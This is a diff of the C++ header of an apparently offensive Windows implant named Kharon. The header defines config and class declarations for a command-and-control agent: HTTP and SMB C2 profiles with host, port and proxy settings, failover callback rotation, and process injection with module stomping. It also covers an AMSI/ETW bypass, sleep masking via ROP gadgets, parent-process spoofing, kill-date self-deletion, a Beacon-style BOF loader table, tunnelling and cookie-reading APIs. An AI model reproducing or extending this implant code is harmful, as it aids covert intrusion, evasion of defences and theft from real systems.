@@ -12,19 +12,6 @@
 #include <aclapi.h>
 #include <ws2tcpip.h>
 
-namespace mscorlib {
-    #include <Mscoree.hh>
-}
-
-typedef mscorlib::_PropertyInfo IPropertyInfo;
-typedef mscorlib::_AppDomain    IAppDomain;
-typedef mscorlib::_Assembly     IAssembly;
-typedef mscorlib::_Type         IType;
-typedef mscorlib::_MethodInfo   IMethodInfo;
-typedef mscorlib::BindingFlags  IBindingFlags;
-
-#include <Clr.h>
-
 #ifdef   WEB_WINHTTP
 #include <winhttp.h>
 #else
@@ -42,13 +29,6 @@ EXTERN_C UPTR StartPtr();
 EXTERN_C UPTR EndPtr();
 
 /* ========= [ Config ] ========= */
-
-#define PROFILE_SMB 0x15
-#define PROFILE_WEB 0x25
-
-#ifndef CALLBACK_COUNT
-#define CALLBACK_COUNT 1
-#endif
 
 #define INJECTION_STANDARD 0x10
 #define INJECTION_STOMPING 0x20
@@ -140,14 +120,6 @@ EXTERN_C UPTR EndPtr();
 #define KH_KILLDATE_ENABLED FALSE
 #endif // KH_KILLDATE_ENABLED
 
-#ifndef KH_PROXY_CALL
-#define KH_PROXY_CALL FALSE
-#endif // KH_PROXY_CALL
-
-#ifndef PROFILE_C2
-#define PROFILE_C2 PROFILE_WEB
-#endif 
-
 #ifndef KH_STOMP_MODULE
 #define KH_STOMP_MODULE L"chakra.dll"
 #endif 
@@ -184,90 +156,6 @@ EXTERN_C UPTR EndPtr();
 #ifndef KH_SLEEP_MASK
 #define KH_SLEEP_MASK eMask::Timer
 #endif // KH_SLEEP_MASK
-
-#ifndef SMB_PIPE_NAME
-#define SMB_PIPE_NAME ""
-#endif // SMB_PIPE_NAME
-
-#ifndef WEB_METHOD
-#define WEB_METHOD L"POST"
-#endif // WEB_METHOD
-
-#ifndef WEB_HOST
-#define WEB_HOST { L"127.0.0.1" }
-#endif // WEB_HOST
-
-#ifndef WEB_HOST_QTT
-#define WEB_HOST_QTT 1
-#endif // WEB_HOST_QTT
-
-#ifndef WEB_PORT
-#define WEB_PORT { 80 }
-#endif // WEB_PORT
-
-#ifndef WEB_PORT_QTT
-#define WEB_PORT_QTT 1
-#endif // WEB_PORT_QTT
-
-#ifndef WEB_ENDPOINT
-#define WEB_ENDPOINT { L"/data" }
-#endif // WEB_ENDPOINT
-
-#ifndef WEB_ENDPOINT_QTT
-#define WEB_ENDPOINT_QTT 1
-#endif // WEB_ENDPOINT_QTT
-
-#ifndef WEB_USER_AGENT
-#define WEB_USER_AGENT L"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
-#endif // WEB_USER_AGENT
-
-#ifndef WEB_HTTP_HEADERS
-#define WEB_HTTP_HEADERS L""
-#endif // WEB_HTTP_HEADERS
-
-#ifndef WEB_SECURE_ENABLED
-#define WEB_SECURE_ENABLED FALSE
-#endif // WEB_SECURE_ENABLED
-
-#ifndef WEB_HTTP_COOKIES_QTT
-#define WEB_HTTP_COOKIES_QTT 0
-#endif // WEB_HTTP_COOKIES_QTT
-
-#ifndef WEB_HTTP_COOKIES
-#define WEB_HTTP_COOKIES {}
-#endif // WEB_HTTP_COOKIES
-
-#ifndef WEB_PROXY_ENABLED
-#define WEB_PROXY_ENABLED FALSE
-#endif // WEB_PROXY_ENABLED
-
-#ifndef WEB_PROXY_URL
-#define WEB_PROXY_URL L""
-#endif // WEB_PROXY_URL
-
-#ifndef WEB_PROXY_USERNAME
-#define WEB_PROXY_USERNAME L""
-#endif // WEB_PROXY_USERNAME
-
-#ifndef WEB_PROXY_PASSWORD
-#define WEB_PROXY_PASSWORD L""
-#endif // WEB_PROXY_PASSWORD
-
-#define COMMAND_TUNNEL_START_TCP 62
-#define COMMAND_TUNNEL_START_UDP 63
-#define COMMAND_TUNNEL_WRITE_TCP 64
-#define COMMAND_TUNNEL_WRITE_UDP 65
-#define COMMAND_TUNNEL_CLOSE     66
-#define COMMAND_TUNNEL_REVERSE   67
-#define COMMAND_TUNNEL_ACCEPT    68
-
-#define TUNNEL_STATE_CLOSE   1
-#define TUNNEL_STATE_READY   2
-#define TUNNEL_STATE_CONNECT 3
-
-#define TUNNEL_MODE_SEND_TCP 0
-#define TUNNEL_MODE_SEND_UDP 1
-#define TUNNEL_MODE_REVERSE_TCP 2
 
 class Crypt;
 class Pivot;
@@ -322,12 +210,22 @@ typedef struct {
     ULONG AmsiEtwBypass;
     ULONG ChunkSize;
 
+    ULONG Profile;
+
     struct {
         ULONG  TechniqueId;
         WCHAR* StompModule;
         ULONG  Allocation;
         ULONG  Writing;
     } Injection;
+
+    struct {
+        ULONG  ParentID;
+        BOOL   Pipe;
+        BOOL   BlockDlls;
+        WCHAR* CurrentDir;
+        WCHAR* SpoofArg;
+    } Ps;
 
     struct {
         WCHAR* Spawnto;
@@ -344,6 +242,9 @@ typedef struct {
     struct {
         UINT8 Beacon;
         BOOL  Heap;
+
+        UPTR NtContinueGadget;
+        UPTR JmpGadget;
     } Mask;
 
     struct {
@@ -367,82 +268,13 @@ typedef struct {
     } KillDate;
 
     struct {
-        WCHAR** Host;
-        ULONG*  Port;
-        WCHAR** EndPoint;
-        ULONG   HostQtt;
-        ULONG   PortQtt;
-        ULONG   EndpointQtt;
-        WCHAR*  UserAgent;
-        WCHAR*  HttpHeaders;
-        WCHAR*  Method;
-        // WCHAR* Cookies[WEB_HTTP_COOKIES_QTT];
-        WCHAR*  ProxyUrl;
-        WCHAR*  ProxyUsername;
-        WCHAR*  ProxyPassword;
-        BOOL    ProxyEnabled;
-        BOOL    Secure;
-    } Web;
+        PROXY_SETTINGS   Proxy;
+        BOOL             Secure;
+        ULONG            Strategy;
+        ULONG            CallbacksCount;
+        HTTP_CALLBACKS** Callbacks;
+    } Http;
 } KHARON_CONFIG;
-
-typedef struct {
-    CHAR* AgentId;
-    ULONG SleepTime;
-    ULONG Jitter;
-    BYTE  EncryptKey[16];
-    ULONG BofProxy;
-    BOOL  Syscall;
-    ULONG AmsiEtwBypass;
-    ULONG ChunkSize;
-
-    struct {
-        ULONG  TechniqueId;
-        WCHAR* StompModule;
-        ULONG  Allocation;
-        ULONG  Writing;
-    } Injection;
-
-    struct {
-        WCHAR* Spawnto;
-        CHAR*  ForkPipe;
-    } Postex;
-
-    struct {
-        CHAR* UserName;
-        CHAR* DomainName;
-        CHAR* IpAddress;
-        CHAR* HostName;
-    } Guardrails;
-
-    struct {
-        UINT8 Beacon;
-        BOOL  Heap;
-    } Mask;
-
-    struct {
-        BOOL Enabled;
-
-        INT16 StartHour;
-        INT16 StartMin;
-
-        INT16 EndHour;
-        INT16 EndMin;
-    } Worktime;
-
-    struct {
-        BOOL Enabled;
-        BOOL SelfDelete; // if true, self delete the process binary of the disk (care should be taken within a grafted process to exclude an accidentally unintended binary.)
-        BOOL ExitProc;   // if true, exit the process, else exit the thread
-
-        INT16 Day;
-        INT16 Month;
-        INT16 Year;
-    } KillDate;
-
-    struct {
-        HTTP_CALLBACKS Callbacks[CALLBACK_COUNT];
-    } Web;
-} KHARON_CONFIG_1;
 
 auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID;
 
@@ -489,99 +321,7 @@ namespace Root {
     
         UINT64 MagicValue = KHARON_HEAP_MAGIC;
 
-        struct {
-            ULONG SleepTime;
-            ULONG Jitter;
-            ULONG Profile;
-
-            BOOL  BofHook;
-            BOOL  Syscall;
-            ULONG AmsiEtwBypass;
-            ULONG ChunkSize;
-
-            struct {
-                ULONG  TechniqueId;
-                WCHAR* StompModule;
-                ULONG  Allocation;
-                ULONG  Writing;
-            } Injection;
-
-            struct {
-                UPTR  NtContinueGadget;
-                UPTR  JmpGadget;
-                UINT8 TechniqueID;
-                BOOL  Heap;
-            } Mask;
-
-            struct {
-                ULONG  ParentID;
-                WCHAR* SpoofArg;
-                BOOL   BlockDlls;
-                WCHAR* CurrentDir;
-                BOOL   Pipe;
-            } Ps;
-
-            struct {
-                WCHAR* Spawnto;
-                CHAR*  ForkPipe;
-            } Postex;
-
-            struct {
-                CHAR* UserName;
-                CHAR* DomainName;
-                CHAR* IpAddress;
-                CHAR* HostName;
-            } Guardrails;
-
-            struct {
-                BOOL Enabled;
-
-                INT16 StartHour;
-                INT16 StartMin;
-
-                INT16 EndHour;
-                INT16 EndMin;
-            } Worktime;
-
-            struct {
-                BOOL Enabled;
-                BOOL SelfDelete; // if true, self delete the process binary of the disk (care should be taken within a grafted process to exclude an accidentally unintended binary.)
-                BOOL ExitProc;   // if true, exit the process, else exit the thread
-
-                INT16 Day;
-                INT16 Month;
-                INT16 Year;
-            } KillDate;
-
-            struct {
-                WCHAR** Host;
-                ULONG*  Port;
-                WCHAR** EndPoint;
-                ULONG   HostQtt;
-                ULONG   PortQtt;
-                ULONG   EndpointQtt;
-                WCHAR*  UserAgent;
-                WCHAR*  HttpHeaders;
-                WCHAR*  Method;
-                // WCHAR* Cookies[WEB_HTTP_COOKIES_QTT];
-                WCHAR*  ProxyUrl;
-                WCHAR*  ProxyUsername;
-                WCHAR*  ProxyPassword;
-                BOOL    ProxyEnabled;
-                BOOL    Secure;
-            } Web = {
-                .HostQtt = 0,
-                .PortQtt = 0,
-                .EndpointQtt = 0,
-            };
-        } Config {
-            .Ps = {
-                .ParentID   = 0,
-                .BlockDlls  = FALSE,
-                .CurrentDir = nullptr,
-                .Pipe       = TRUE,
-            },
-        };
+        KHARON_CONFIG Config;
 
         struct {
             ULONG AllocGran;
@@ -691,14 +431,24 @@ namespace Root {
         struct {
             UPTR Handle;
 
+            DECLAPI( sprintf );
             DECLAPI( printf );
             DECLAPI( vprintf );
             DECLAPI( vsnprintf );
+            DECLAPI( k_vswprintf );
+            DECLAPI( k_swprintf );
+            DECLAPI( wcscat );
+            DECLAPI( wcscpy );
             DECLAPI( strncpy );
         } Msvcrt = {
+            RSL_TYPE( sprintf ),
             RSL_TYPE( printf ),
             RSL_TYPE( vprintf ),
             RSL_TYPE( vsnprintf ),
+            RSL_TYPE( k_vswprintf ),
+            RSL_TYPE( k_swprintf ),
+            RSL_TYPE( wcscat ),
+            RSL_TYPE( wcscpy ),
             RSL_TYPE( strncpy ),
         };
 
@@ -1110,14 +860,6 @@ namespace Root {
             RSL_TYPE( RtlEnterCriticalSection ),
             RSL_TYPE( RtlDeleteCriticalSection ),
         };
-           
-        struct {
-            UPTR Handle;
-
-            DECLAPI( CommandLineToArgvW );
-        } Shell32 = {
-            RSL_TYPE( CommandLineToArgvW ),
-        };
 
         struct {
             UPTR Handle;
@@ -1135,46 +877,6 @@ namespace Root {
         } User32 = {
 	    RSL_TYPE( wsprintfW ),
             RSL_TYPE( ShowWindow ),
-        };
-
-        struct {
-            HANDLE Handle;
-
-            DECLAPI( CoInitialize );
-            DECLAPI( CoInitializeEx );
-        } Ole32 = {
-            RSL_TYPE( CoInitialize ),
-            RSL_TYPE( CoInitializeEx ),
-        };
-
-        struct {
-            UPTR Handle;
-
-            DECLAPI( VariantClear );
-            DECLAPI( VariantInit );
-            DECLAPI( SafeArrayGetDim );
-            DECLAPI( SafeArrayAccessData );
-            DECLAPI( SafeArrayGetLBound );
-            DECLAPI( SafeArrayGetUBound );
-            DECLAPI( SafeArrayCreateVector );
-            DECLAPI( SafeArrayCreate );
-            DECLAPI( SysFreeString );
-            DECLAPI( SysAllocString );
-            DECLAPI( SafeArrayPutElement );
-            DECLAPI( SafeArrayDestroy );
-        } Oleaut32 = {
-            RSL_TYPE( VariantClear ),
-            RSL_TYPE( VariantInit ),
-            RSL_TYPE( SafeArrayGetDim ),
-            RSL_TYPE( SafeArrayAccessData ),
-            RSL_TYPE( SafeArrayGetLBound ),
-            RSL_TYPE( SafeArrayGetUBound ),
-            RSL_TYPE( SafeArrayCreateVector ),
-            RSL_TYPE( SafeArrayCreate ),
-            RSL_TYPE( SysFreeString ),
-            RSL_TYPE( SysAllocString ),
-            RSL_TYPE( SafeArrayPutElement ),
-            RSL_TYPE( SafeArrayDestroy ),
         };
 
         struct {
@@ -1243,16 +945,6 @@ namespace Root {
 
         struct {
             UPTR Handle;
-
-            DECLAPI( CLRCreateInstance );
-            DECLAPI( LoadLibraryShim );
-        } Mscoree = {
-            RSL_TYPE( CLRCreateInstance ),
-            RSL_TYPE( LoadLibraryShim ),
-        };
-
-        struct {
-            UPTR Handle;
     
             DECLAPI( InternetOpenW       );
             DECLAPI( InternetConnectW    );
@@ -1260,6 +952,10 @@ namespace Root {
 	        DECLAPI( HttpAddRequestHeadersW );
             DECLAPI( InternetSetOptionW  );
             DECLAPI( InternetSetCookieW  );
+            DECLAPI( InternetSetCookieA  );
+            DECLAPI( InternetGetCookieA  );
+            DECLAPI( InternetGetCookieW  );
+            DECLAPI( InternetGetCookieExA  );
             DECLAPI( HttpSendRequestW    );
             DECLAPI( HttpQueryInfoW      );
             DECLAPI( InternetReadFile    );
@@ -1271,6 +967,10 @@ namespace Root {
 	        RSL_TYPE( HttpAddRequestHeadersW ),
             RSL_TYPE( InternetSetOptionW  ),
             RSL_TYPE( InternetSetCookieW  ),
+            RSL_TYPE( InternetSetCookieA  ),
+            RSL_TYPE( InternetGetCookieA  ),
+            RSL_TYPE( InternetGetCookieW  ),
+            RSL_TYPE( InternetGetCookieExA  ),
             RSL_TYPE( HttpSendRequestW    ),
             RSL_TYPE( HttpQueryInfoW      ),
             RSL_TYPE( InternetReadFile    ),
@@ -1547,28 +1247,29 @@ public:
         ApiTable[4]  = { Hsh::Str("BeaconDataLength"),             reinterpret_cast<PVOID>(&Coff::DataLength) },
         ApiTable[5]  = { Hsh::Str("BeaconOutput"),                 reinterpret_cast<PVOID>(&Coff::Output) },
         ApiTable[6]  = { Hsh::Str("BeaconPrintf"),                 reinterpret_cast<PVOID>(&Coff::Printf) },
-        ApiTable[7]  = { Hsh::Str("BeaconAddValue"),               reinterpret_cast<PVOID>(&Coff::AddValue) },
-        ApiTable[8]  = { Hsh::Str("BeaconGetValue"),               reinterpret_cast<PVOID>(&Coff::GetValue) },
-        ApiTable[9]  = { Hsh::Str("BeaconRemoveValue"),            reinterpret_cast<PVOID>(&Coff::RmValue) },
-        ApiTable[10] = { Hsh::Str("BeaconVirtualAlloc"),           reinterpret_cast<PVOID>(&Coff::VirtualAlloc) },
-        ApiTable[11] = { Hsh::Str("BeaconVirtualProtect"),         reinterpret_cast<PVOID>(&Coff::VirtualProtect) },
-        ApiTable[12] = { Hsh::Str("BeaconVirtualAllocEx"),         reinterpret_cast<PVOID>(&Coff::VirtualAllocEx) },
-        ApiTable[13] = { Hsh::Str("BeaconVirtualProtectEx"),       reinterpret_cast<PVOID>(&Coff::VirtualProtectEx) },
-        ApiTable[14] = { Hsh::Str("BeaconIsAdmin"),                reinterpret_cast<PVOID>(&Coff::IsAdmin) },
-        ApiTable[15] = { Hsh::Str("BeaconUseToken"),               reinterpret_cast<PVOID>(&Coff::UseToken) },
-        ApiTable[15] = { Hsh::Str("BeaconRevertToken"),            reinterpret_cast<PVOID>(&Coff::RevertToken) },
-        ApiTable[16] = { Hsh::Str("BeaconOpenProcess"),            reinterpret_cast<PVOID>(&Coff::OpenProcess) },
-        ApiTable[17] = { Hsh::Str("BeaconOpenThread"),             reinterpret_cast<PVOID>(&Coff::OpenThread) },
-        ApiTable[18] = { Hsh::Str("BeaconFormatAlloc"),            reinterpret_cast<PVOID>(&Coff::FmtAlloc) },
-        ApiTable[19] = { Hsh::Str("BeaconFormatAppend"),           reinterpret_cast<PVOID>(&Coff::FmtAppend) },
-        ApiTable[20] = { Hsh::Str("BeaconFormatFree"),             reinterpret_cast<PVOID>(&Coff::FmtFree) },
-        ApiTable[21] = { Hsh::Str("BeaconFormatInt"),              reinterpret_cast<PVOID>(&Coff::FmtInt) },
-        ApiTable[22] = { Hsh::Str("BeaconFormatPrintf"),           reinterpret_cast<PVOID>(&Coff::FmtPrintf) },
-        ApiTable[23] = { Hsh::Str("BeaconFormatReset"),            reinterpret_cast<PVOID>(&Coff::FmtReset) },
-        ApiTable[24] = { Hsh::Str("BeaconFormatToString"),         reinterpret_cast<PVOID>(&Coff::FmtToString) },
-        ApiTable[25] = { Hsh::Str("BeaconWriteAPC"),               reinterpret_cast<PVOID>(&Coff::WriteApc) },
-        ApiTable[26] = { Hsh::Str("BeaconDripAlloc"),              reinterpret_cast<PVOID>(&Coff::DriAlloc) },
-        ApiTable[27] = { Hsh::Str("BeaconGetSpawnTo"),             reinterpret_cast<PVOID>(&Coff::GetSpawn) },
+        ApiTable[7]  = { Hsh::Str("BeaconPrintfW"),                reinterpret_cast<PVOID>(&Coff::PrintfW) },
+        ApiTable[8]  = { Hsh::Str("BeaconAddValue"),               reinterpret_cast<PVOID>(&Coff::AddValue) },
+        ApiTable[9]  = { Hsh::Str("BeaconGetValue"),               reinterpret_cast<PVOID>(&Coff::GetValue) },
+        ApiTable[10] = { Hsh::Str("BeaconRemoveValue"),            reinterpret_cast<PVOID>(&Coff::RmValue) },
+        ApiTable[11] = { Hsh::Str("BeaconVirtualAlloc"),           reinterpret_cast<PVOID>(&Coff::VirtualAlloc) },
+        ApiTable[12] = { Hsh::Str("BeaconVirtualProtect"),         reinterpret_cast<PVOID>(&Coff::VirtualProtect) },
+        ApiTable[13] = { Hsh::Str("BeaconVirtualAllocEx"),         reinterpret_cast<PVOID>(&Coff::VirtualAllocEx) },
+        ApiTable[14] = { Hsh::Str("BeaconVirtualProtectEx"),       reinterpret_cast<PVOID>(&Coff::VirtualProtectEx) },
+        ApiTable[15] = { Hsh::Str("BeaconIsAdmin"),                reinterpret_cast<PVOID>(&Coff::IsAdmin) },
+        ApiTable[16] = { Hsh::Str("BeaconUseToken"),               reinterpret_cast<PVOID>(&Coff::UseToken) },
+        ApiTable[17] = { Hsh::Str("BeaconRevertToken"),            reinterpret_cast<PVOID>(&Coff::RevertToken) },
+        ApiTable[18] = { Hsh::Str("BeaconOpenProcess"),            reinterpret_cast<PVOID>(&Coff::OpenProcess) },
+        ApiTable[19] = { Hsh::Str("BeaconOpenThread"),             reinterpret_cast<PVOID>(&Coff::OpenThread) },
+        ApiTable[20] = { Hsh::Str("BeaconFormatAlloc"),            reinterpret_cast<PVOID>(&Coff::FmtAlloc) },
+        ApiTable[21] = { Hsh::Str("BeaconFormatAppend"),           reinterpret_cast<PVOID>(&Coff::FmtAppend) },
+        ApiTable[22] = { Hsh::Str("BeaconFormatFree"),             reinterpret_cast<PVOID>(&Coff::FmtFree) },
+        ApiTable[23] = { Hsh::Str("BeaconFormatInt"),              reinterpret_cast<PVOID>(&Coff::FmtInt) },
+        ApiTable[24] = { Hsh::Str("BeaconFormatPrintf"),           reinterpret_cast<PVOID>(&Coff::FmtPrintf) },
+        ApiTable[25] = { Hsh::Str("BeaconFormatReset"),            reinterpret_cast<PVOID>(&Coff::FmtReset) },
+        ApiTable[26] = { Hsh::Str("BeaconFormatToString"),         reinterpret_cast<PVOID>(&Coff::FmtToString) },
+        ApiTable[27] = { Hsh::Str("BeaconWriteAPC"),               reinterpret_cast<PVOID>(&Coff::WriteApc) },
+        ApiTable[28] = { Hsh::Str("BeaconDripAlloc"),              reinterpret_cast<PVOID>(&Coff::DriAlloc) },
+        ApiTable[29] = { Hsh::Str("BeaconGetSpawnTo"),             reinterpret_cast<PVOID>(&Coff::GetSpawn) },
     };
 
     auto Add(
@@ -1650,6 +1351,12 @@ public:
     static auto FmtInt(
         FMTP* fmt,
         INT32 val
+    ) -> VOID;
+
+    static auto FmtPrintfW(
+        FMTP*  Fmt,
+        WCHAR* Data,
+        ...
     ) -> VOID;
 
     static auto FmtPrintf(
@@ -1743,6 +1450,12 @@ public:
     static auto RmValue(
         PCCH key
     ) -> BOOL;
+
+    static auto PrintfW(
+        INT  type,
+        PWCH fmt,
+        ...
+    ) -> VOID;
 
     static auto Printf(
         INT  type,
@@ -1997,12 +1710,68 @@ public:
 
     PPACKAGE Shared = nullptr;
 
+    auto Base32W(
+        _In_      const PVOID in,
+        _In_      SIZE_T inlen,
+        _Out_opt_ PVOID  out,
+        _In_opt_  SIZE_T outlen,
+        _In_      Base32Action Action
+    ) -> SIZE_T;
+
+    auto HexW(
+        _In_      const PVOID in,
+        _In_      SIZE_T inlen,
+        _Out_opt_ PVOID  out,
+        _In_opt_  SIZE_T outlen,
+        _In_      HexAction Action
+    ) -> SIZE_T;
+
+    auto Base64W(
+        _In_      const PVOID in,
+        _In_      SIZE_T inlen,
+        _Out_opt_ PVOID  out,
+        _In_opt_  SIZE_T outlen,
+        _In_      Base64Action Action
+    ) -> SIZE_T;
+
+    auto Base64URLW(
+        _In_      const PVOID in,
+        _In_      SIZE_T inlen,
+        _Out_opt_ PVOID  out,
+        _In_opt_  SIZE_T outlen,
+        _In_      Base64URLAction Action
+    ) -> SIZE_T;
+
     auto Base64(
         _In_      const PVOID in,
         _In_      SIZE_T inlen,
         _Out_opt_ PVOID  out,
         _In_opt_  SIZE_T outlen,
         _In_      Base64Action Action 
+    ) -> SIZE_T;
+
+    auto Base32(
+        _In_      const PVOID in,
+        _In_      SIZE_T inlen,
+        _Out_opt_ PVOID  out,
+        _In_opt_  SIZE_T outlen,
+        _In_      Base32Action Action
+    ) -> SIZE_T;
+
+    auto Base64URL(
+        _In_      const PVOID in,
+        _In_      SIZE_T inlen,
+        _Out_opt_ PVOID  out,
+        _In_opt_  SIZE_T outlen,
+        _In_      Base64URLAction Action
+    ) -> SIZE_T;
+
+    auto Hex(
+        _In_      const PVOID in,
+        _In_      SIZE_T inlen,
+        _Out_opt_ PVOID  out,
+        _In_opt_  SIZE_T outlen,
+        _In_      HexAction Action
     ) -> SIZE_T;
 
     auto SendOut(
@@ -2018,9 +1787,14 @@ public:
         ...    
     ) -> BOOL;
     
-    auto SendMsg(
+    auto SendMsgA(
         _In_ ULONG Type,
         _In_ CHAR* Message
+    ) -> BOOL;
+
+    auto SendMsgW(
+        _In_ ULONG  Type,
+        _In_ WCHAR* Message
     ) -> BOOL;
 
     auto Int16( 
@@ -2201,6 +1975,76 @@ public:
     ULONG DownloadTasksCount = 0;
     ULONG TunnelTasksCount   = 0;
 
+    ULONG RoundRobinIdx = 0;
+    ULONG FailoverIdx   = 0;
+    ULONG FailCount     = 0;
+
+    auto StrategyRot( VOID ) -> HTTP_CALLBACKS*;
+
+    auto CleanupHttpContext( HTTP_CONTEXT* Ctx ) -> BOOL;
+
+    auto PrepareUrlAndMethod(
+        _In_  HTTP_CONTEXT*   Ctx,
+        _In_  HTTP_CALLBACKS* Callback,
+        _In_  BOOL            Secure,
+        _Out_ WCHAR**         OutMethodStr,
+        _Out_ HTTP_METHOD*    OutMethod
+    ) -> BOOL;
+
+    auto EncodeClientData( 
+        _In_ MM_INFO*       SendData, 
+        _In_ MM_INFO*       EncodedData,
+        _In_ OUTPUT_FORMAT* ClientOut,
+        _In_ PVOID*         ObjFreePtr
+    ) -> BOOL;
+
+    auto DecodeServerData( 
+        _In_ MM_INFO*       RespData, 
+        _In_ MM_INFO*       DecodedData,
+        _In_ OUTPUT_FORMAT* ServerOut
+    ) -> BOOL;
+
+    auto ProcessClientOutput(
+        _In_ HTTP_CONTEXT*  Ctx,
+        _In_ MM_INFO*       EncodedData,
+        _In_ OUTPUT_TYPE    ClientOutType,
+        _In_ HTTP_ENDPOINT* Endpoint,
+        _In_ HTTP_METHOD*   Method,
+        _In_ OUTPUT_FORMAT* ClientOut
+    ) -> BOOL;
+
+    auto ProcessServerOutput(
+        _In_ HANDLE         RequestHandle,
+        _In_ CHAR*          cTargetUrl,
+        _In_ OUTPUT_TYPE    ServerOutType,
+        _In_ OUTPUT_FORMAT* ServerOut,
+        _In_ MM_INFO*       RespData
+    ) -> BOOL;
+
+    auto SendHttpRequest(
+        _In_ HTTP_CONTEXT* Ctx,
+        _In_ WCHAR*   Method,
+        _In_ WCHAR*   Path,
+        _In_ WCHAR*   Headers,
+        _In_ MM_INFO* Body,
+        _In_ BOOL     Secure
+    ) -> BOOL;
+
+    auto ConnectToServer(
+        _In_ HTTP_CONTEXT* Ctx,
+        _In_ HTTP_CALLBACKS* Callback,
+        _In_ BOOL   ProxyEnabled,
+        _In_ WCHAR* ProxyUsername,
+        _In_ WCHAR* ProxyPassword
+    ) -> BOOL;
+
+    auto OpenInternetSession(
+        _In_ HTTP_CONTEXT*   Ctx,
+        _In_ HTTP_CALLBACKS* Callback,
+        _In_ BOOL            ProxyEnabled,
+        _In_ WCHAR*          ProxyUrl
+    ) -> BOOL;
+
     struct {
         PVOID  Node;
 #if PROFILE_C2 == PROFILE_SMB
@@ -2237,24 +2081,18 @@ public:
     ) -> BOOL;
 
     auto Send(
-        _In_      PVOID   Data,
-        _In_      UINT64  Size,
-        _Out_opt_ PVOID  *RecvData,
-        _Out_opt_ UINT64 *RecvSize
+        _In_      MM_INFO* SendData,
+        _Out_opt_ MM_INFO* RecvData
     ) -> BOOL;
 
     auto SmbSend(
-        _In_      PVOID   Data,
-        _In_      UINT64  Size,
-        _Out_opt_ PVOID  *RecvData,
-        _Out_opt_ UINT64 *RecvSize
+        _In_      MM_INFO* SendData,
+        _Out_opt_ MM_INFO* RecvData
     ) -> BOOL;
 
-    auto WebSend(
-        _In_      PVOID   Data,
-        _In_      UINT64  Size,
-        _Out_opt_ PVOID  *RecvData,
-        _Out_opt_ UINT64 *RecvSize
+    auto HttpSend(
+        _In_      MM_INFO* SendData,
+        _Out_opt_ MM_INFO* RecvData
     ) -> BOOL;
 };
 
@@ -2300,6 +2138,8 @@ private:
     Root::Kharon* Self;
 public:
     Task( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    BOOL HasTask;
 
     auto Dispatcher( 
         VOID 
@@ -2612,6 +2452,11 @@ public:
     auto CheckPtr( 
         _In_ PVOID Ptr 
     ) -> BOOL;
+
+    auto Append(
+        _In_ PVOID Ptr,
+        _In_ ULONG Size
+    ) -> VOID;
 
     auto Alloc(
         _In_ ULONG Size
